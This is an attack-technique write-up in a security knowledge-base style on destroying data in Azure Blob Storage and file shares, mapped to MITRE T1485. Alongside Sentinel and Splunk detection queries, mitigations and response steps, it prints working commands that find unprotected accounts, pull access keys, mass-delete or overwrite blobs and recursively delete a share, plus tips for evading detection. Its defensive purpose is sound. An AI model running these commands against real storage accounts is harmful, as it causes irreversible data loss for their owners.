# [IMPACT-DATA-DESTROY-001]: Data Destruction via Blob Storage

## 1. METADATA HEADER

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | IMPACT-DATA-DESTROY-001 |
| **Technique Name** | Data Destruction via Blob Storage |
| **MITRE ATT&CK v18.1** | Data Destruction (T1485) – https://attack.mitre.org/techniques/T1485/ |
| **Tactic** | Impact |
| **Platforms** | Azure Storage (Blob, File), Entra ID, Azure Resource Manager |
| **Environment** | Entra ID / Azure Storage Accounts |
| **Severity** | Critical |
| **CVE** | N/A (abuse of legitimate APIs; may coexist with specific CVEs in access path) |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All Azure Storage account types (GPv1, GPv2, BlobStorage), across all public regions |
| **Patched In** | N/A – mitigated via soft delete, versioning, immutable storage, RBAC and network controls, but core delete operations remain by design.[34][37][43] |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

- **Concept:** This technique covers malicious deletion and overwriting of data stored in Azure Blob Storage and File Shares. After compromising an identity with sufficient permissions (e.g., Storage Account Contributor or access keys), the adversary issues large‑scale `DeleteBlob` / `DeleteFile` operations or overwrites blobs with junk data to render information irrecoverable.[36][42] In cloud ransomware campaigns, this is often combined with encryption or destruction of on‑prem/VM data to maximize business impact and eliminate recovery paths.[19]
- **Attack Surface:** Azure Storage accounts (Blob containers, file shares), Azure Portal, ARM APIs, Azure CLI/PowerShell, Storage access keys, SAS tokens, and Azure Files mounts.
- **Business Impact:** **Irreversible loss of structured and unstructured data hosted in Azure, including backups, logs, and critical application content.** When soft delete, versioning, or immutable storage are disabled or misconfigured, mass deletion can lead to permanent loss of customer data, intellectual property, and evidence required for investigations.[34][37]
- **Technical Context:** Azure Storage logs all control‑plane delete operations in Storage logs and Azure Activity Logs, and mass deletions can be detected via Sentinel hunting queries and built‑in analytics (e.g., Azure Storage Mass File Deletion analytic rule).[35][44] However, many tenants do not enable or retain these logs by default, and attackers may leverage access keys instead of Entra ID identities, reducing attribution.[19][23]

### Operational Risk

- **Execution Risk:** High – Large‑scale deletions or overwrites in Azure Storage are fast and can impact petabytes of data in minutes. Some recovery is possible if versioning/soft delete/immutable storage are configured, but otherwise impact is effectively permanent.[34][37]
- **Stealth:** Medium – Individual deletes are noisy only when logging and analytics are tuned; otherwise, attackers may script slow, distributed deletions from multiple IPs to blend with normal activity.[36]
- **Reversibility:** Variable – If blob versioning and soft delete are enabled with sufficient retention, most destruction can be rolled back. Without them, overwrites and hard deletes are not practically reversible.[34][37][43]

### Compliance Mappings

| Framework | Control / ID | Description (Failure Mode) |
|---|---|---|
| **CIS Azure Foundations** | CIS AZURE 3.6, 4.4 | Lack of diagnostics/metrics and missing soft delete/versioning on storage accounts leads to undetected and unrecoverable blob deletions. |
| **DISA STIG** | Azure Storage STIG (logging, backup) | Non‑compliance with logging and backup STIGs for mission‑critical cloud storage. |
| **CISA SCuBA** | Data Protection, Logging | Failure to enable immutable storage, soft delete, and comprehensive logging for SaaS/PaaS data stores. |
| **NIST SP 800‑53 Rev.5** | CP-9, CP-10, SI-12, AU-12 | Weak backup and recovery for cloud data, insufficient audit logging for storage operations, and lack of integrity protections.[39] |
| **GDPR** | Art. 5(1)(f), 32 | Inability to ensure integrity and availability of personal data stored in Azure, leading to possible supervisory sanctions. |
| **DORA** | Art. 11 | Inadequate data backup and recovery for critical financial services relying on cloud storage. |
| **NIS2** | Art. 21 | Non‑implementation of measures to ensure system and network resilience and maintain operations in case of incidents. |
| **ISO 27001:2022** | A.8.13, A.5.30 | Missing protection of information in cloud services and lack of secure backup. |
| **ISO 27005** | Risk Scenario: "Cloud object storage mass deletion" | High‑impact scenario involving loss of long‑term records and backups in cloud object stores. |

---

## 3. TECHNICAL PREREQUISITES

- **Required Privileges:**
  - Storage Account Owner/Contributor or custom role with `Microsoft.Storage/storageAccounts/listKeys/action`, `Microsoft.Storage/storageAccounts/blobServices/containers/delete`, `Microsoft.Storage/storageAccounts/blobServices/containers/blobs/delete`.
  - Alternatively, possession of storage account access keys or Shared Access Signatures (SAS) granting delete permissions.[19][43]
- **Required Access:**
  - Network access to Storage endpoints (HTTPS) – may be public or restricted via private endpoints.

**Supported Versions:**
- All Azure Storage account SKUs supporting blob containers and file shares.

- **Attacker Tools:**
  - Azure CLI (`az storage blob delete`, `az storage container delete`).
  - Az PowerShell (`Remove-AzStorageBlob`).
  - REST API clients / scripts using storage keys or SAS.

- **Defender Tools:**
  - Azure Monitor & Storage logs – https://learn.microsoft.com/azure/storage/blobs/monitor-blob-storage
  - Microsoft Sentinel (Azure Storage solutions and queries) – https://github.com/Azure/Azure-Sentinel
  - Azure Backup / immutable storage configuration – https://learn.microsoft.com/azure/backup/secure-by-default

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Azure CLI – Enumerate Storage Accounts and Protection Settings

```bash
az storage account list -o table
```

**What to Look For:**
- High‑value accounts (production RGs, data‑lake accounts).

```bash
az storage account show --name <storageAccount> --resource-group <RG> \
  --query "{name:name, kind:kind, enableBlobVersioning:blobServices.defaultServiceVersion, 
           deleteRetentionPolicy:blobServices.deleteRetentionPolicy.enabled}"
```

**What to Look For:**
- Storage accounts with **no soft delete** or **no versioning** enabled – these are prime destruction targets.[34][47]

### Log Reconnaissance – Identify Prior Suspicious Deletes

```kusto
StorageBlobLogs
| where TimeGenerated > ago(7d)
| where OperationName == "DeleteBlob" and StatusText == "Success"
| summarize Deleted = count() by AccountName, CallerIpAddress, UserAgentHeader
| order by Deleted desc
```

**What to Look For:**
- Unusual IPs or user agents performing large numbers of deletes.

---

## 5. DETAILED EXECUTION METHODS AND THEIRS STEPS

### METHOD 1 – Mass Deletion via Azure CLI Using Access Keys

**Supported Versions:** All Azure Storage account types.

#### Step 1: Obtain Storage Account Keys

**Objective:** Use elevated role to retrieve access keys, bypassing Entra ID attribution.

```bash
az storage account keys list -g <RG_NAME> -n <STORAGE_ACCOUNT>
```

**Expected Output:**
- Primary and secondary keys; attacker typically uses Primary key.

#### Step 2: Delete All Blobs in Target Containers

**Objective:** Use keys to authenticate and delete blobs programmatically.

```bash
ACCOUNT=<STORAGE_ACCOUNT>
KEY=<PRIMARY_KEY>
CONTAINER=<CONTAINER_NAME>

az storage blob delete-batch \
  --account-name $ACCOUNT \
  --account-key $KEY \
  --source $CONTAINER \
  --delete-snapshots include
```

**Expected Output:**
- Summary of deleted blobs; underlying logs record `DeleteBlob` operations in StorageBlobLogs.[35]

**OpSec & Evasion:**
- Use secondary key and rotate primary to mask intent.
- Throttle deletions to avoid obvious spikes.

**References & Proofs:**
- Azure Storage CLI – https://learn.microsoft.com/azure/storage/blobs/storage-quickstart-blobs-cli

### METHOD 2 – Overwriting Blobs with Junk Data

**Objective:** Render data unrecoverable even when some retention settings exist.

```bash
az storage blob upload-batch \
  --account-name $ACCOUNT \
  --account-key $KEY \
  --source ./junk-data-folder \
  --destination $CONTAINER \
  --overwrite true
```

Attackers may upload random data to overwrite existing blob content, then delete prior versions if not protected by immutability.[36]

### METHOD 3 – Destruction via Mounted Azure Files

When Azure Files shares are mounted to VMs/on‑prem servers, adversaries can use OS delete operations (e.g., `del`, `rm`) against UNC paths or mapped drives – still recorded in StorageFileLogs.

```powershell
Remove-Item \\storageaccount.file.core.windows.net\share\* -Recurse -Force
```

---

## 6. ATTACK SIMULATION & VERIFICATION (Atomic Red Team)

While Atomic Red Team T1485 primarily targets local disks and GCP buckets, similar patterns can be adapted for Azure storage operations.[64][70][67]

- **Atomic Test ID:** T1485, selected tests (e.g., SDelete, cloud bucket deletion).
- **Usage:** Execute local destruction tests to verify SIEM detections, then extend logic to StorageBlobLogs/StorageFileLogs.

Example Windows test (SDelete) to validate general T1485 detections:
```powershell
Invoke-AtomicTest T1485 -TestNumbers 1
```

Cleanup:
```powershell
Invoke-AtomicTest T1485 -TestNumbers 1 -Cleanup
```

Reference: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1485/T1485.md

---

## 7. TOOLS & COMMANDS REFERENCE

### Azure Storage Explorer / Portal

GUI tools make it easy to perform bulk deletions; defenders should monitor their usage for privileged accounts.

### Azure CLI / Az PowerShell

- `az storage blob delete-batch`
- `az storage container delete`
- `Remove-AzStorageContainer`, `Remove-AzStorageBlob`

Ensure Role‑Based Access Control and conditional access around their use.

---

## 8. SPLUNK DETECTION RULES

### Rule 1: Azure Storage Mass File Deletion (Blob & File)

**Reference:** Azure Sentinel query `Azure Storage Mass File Deletion` shows the core pattern.[35]

**SPL (adapted):**
```spl
index=azure sourcetype="azure:storage:blob" OR sourcetype="azure:storage:file"
| where StatusText="Success" AND (OperationName="DeleteBlob" OR OperationName="DeleteFile")
| eval IP=split(CallerIpAddress, ":")[0]
| bin _time span=10m
| stats dc(Uri) as FilesDeleted by _time, IP, UserAgentHeader, AccountName
| where FilesDeleted >= 100
```

**What This Detects:**
- IPs or tools deleting ≥100 objects within 10 minutes in a single storage account – highly suspicious outside of controlled maintenance.

---

## 9. MICROSOFT SENTINEL DETECTION

### Query 1: Azure Storage Mass File Deletion (Official Analytic)

**Reference:** `AzureStorageMassDeletion.yaml` analytic rule for T1485.[35][38]

**KQL (core pattern):**
```kusto
let deleteThreshold = 100;
let deleteWindow = 10m;
union StorageFileLogs, StorageBlobLogs
| where StatusText == "Success"
| where OperationName in ("DeleteBlob","DeleteFile")
| extend CallerIpAddress = tostring(split(CallerIpAddress, ":", 0)[0])
| summarize dcount(Uri) by bin(TimeGenerated, deleteWindow), CallerIpAddress, UserAgentHeader, AccountName
| where dcount_Uri >= deleteThreshold
```

Use this as a scheduled analytics rule with **High** severity.

---

## 10. WINDOWS EVENT LOG MONITORING

_Not applicable – impact occurs on Azure Storage control plane. Monitoring relies on Azure logs, not local OS events._

---

## 11. SYSMON DETECTION PATTERNS

_Not applicable for direct blob deletion via APIs. Sysmon becomes relevant only when destruction is performed from endpoints against mounted Azure Files shares; in that case, treat it as generic T1485 on the endpoint._

---

## 12. MICROSOFT DEFENDER FOR CLOUD

- Enable **Defender for Storage** to detect anomalous access patterns and potential ransomware behaviors against storage accounts.[23][31]
- Defender can flag unusual delete spikes or suspicious tools accessing storage endpoints.

Manual steps: Azure Portal → **Microsoft Defender for Cloud → Environment settings → Subscription → Defender plans → Defender for Storage: ON**.

---

## 13. MICROSOFT PURVIEW (UNIFIED AUDIT LOG)

For M365 workloads that sync to Azure Storage or use similar patterns (Dataverse, SharePoint, OneDrive), Purview provides audit signals for mass deletes or suspicious bulk operations.[20][38]

Example Purview search pattern:
```powershell
Search-UnifiedAuditLog -Operations FileDeleted -StartDate (Get-Date).AddDays(-1) -ResultSize 5000
```

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Action 1: Enable Blob Versioning and Soft Delete Everywhere**
- Turn on blob versioning and soft delete for all production storage accounts to ensure recoverability from destructive operations.[34][37][43]

**Manual Steps (Portal):**
1. Storage Account → **Data protection**.  
2. Enable **Blob soft delete**, **Container soft delete**, and **Blob versioning**.  
3. Configure retention (e.g., ≥30 days, preferably ≥90 for critical data).

**Action 2: Use Immutable Storage (WORM) for Critical Data**
- Configure immutable storage policies (time‑based retention or legal hold) for backup/archival containers.[37]

**Action 3: Minimize and Monitor Access Keys & SAS**
- Prefer Entra ID–based access.  
- Rotate keys regularly; restrict SAS to least privilege and shortest possible lifetime.[19][43]

### Priority 2: HIGH

**Action: Centralize Logging and Create Mass Deletion Alerts**
- Enable diagnostic settings for Storage accounts to send logs to Log Analytics and Sentinel.[47][44]
- Deploy analytic rules for mass deletions (as above).

---

## 15. DETECTION & INCIDENT RESPONSE

### IOCs

- **Logs:** Spikes in `DeleteBlob` / `DeleteFile` operations; unusual CallerIpAddress or UserAgentHeader values in Storage logs.[35]
- **Accounts:** New or rarely used service principals suddenly performing large deletions.

### Forensic Artifacts

- **StorageBlobLogs/StorageFileLogs:** Authoritative source for what was deleted, when, and from where.[36][47]
- **Azure Activity Logs:** Changes to Storage account configuration (disabling soft delete, changing immutability, rotating keys).

### Response Procedures

1. **Contain:**
   - Revoke compromised access keys; regenerate both primary and secondary keys.
   - Disable or rotate suspicious SAS tokens.
2. **Investigate:**
   - Use Sentinel queries to identify scope of deletion, affected containers, and caller identity/IP.[35][44]
3. **Recover:**
   - Restore blobs from versions or soft‑deleted state.  
   - For immutable containers, use retention policies to restore to last known good state.[34][37]

---

## 16. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | Initial Access | IA-VALID-001 | Compromise of cloud admin / storage operator account or CI/CD credentials. |
| **2** | Privilege Escalation | PE-VALID-010 | Elevation to Storage Account Contributor / Owner or obtaining storage keys via Key Vault abuse. |
| **3** | Current Step | **[IMPACT-DATA-DESTROY-001] Data Destruction via Blob Storage** | Mass deletion and overwriting of blobs and files in Azure Storage. |
| **4** | Impact | T1486, T1490 | Parallel encryption and inhibition of recovery in linked workloads and backups. |

---

## 17. REAL-WORLD EXAMPLES

### Example 1: BlackCat/ALPHV Encrypting Azure Storage

- **Target:** Azure Storage accounts for a large enterprise.  
- **Timeline:** 2024–2025.  
- **Details:** Sophos and Mitiga reported BlackCat/ALPHV using a new encryptor variant to encrypt Azure Storage accounts by leveraging stolen Storage account keys obtained after pivoting from on‑prem to Azure Portal.[19]  
- **Impact:** Encrypted blob data across multiple accounts; complex restoration from backups; increased ransom leverage.

### Example 2: Cloud Mass Deletion as Data Destruction

- **Target:** Various organizations using cloud storage providers.  
- **Details:** MITRE ATT&CK notes that in cloud environments, adversaries may delete storage accounts, machine images, and other infrastructure to damage organizations.[36][39]  
- **Relevance to Azure:** The same pattern applies directly to Azure Storage accounts; without versioning and soft delete, deletions can be unrecoverable.

---